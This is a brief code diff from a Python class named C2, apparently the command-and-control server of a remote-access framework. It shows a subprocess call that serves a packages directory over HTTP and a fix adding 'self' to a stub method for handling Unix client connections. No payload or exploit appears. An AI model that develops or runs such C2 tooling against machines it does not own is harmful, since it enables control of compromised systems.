@@ -1048,7 +1048,7 @@ class C2():
             globals()['package_handler'] = subprocess.Popen('{} -m {} {}'.format(sys.executable, http_serv_mod, port + 2), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, cwd=globals()['packages'], shell=True)
 
 
-    def process_unix(command, conn):
+    def process_unix(self, command, conn):
         # Find the socket index
         # Find the correct connection from that socket
         # Call the command on that connection??
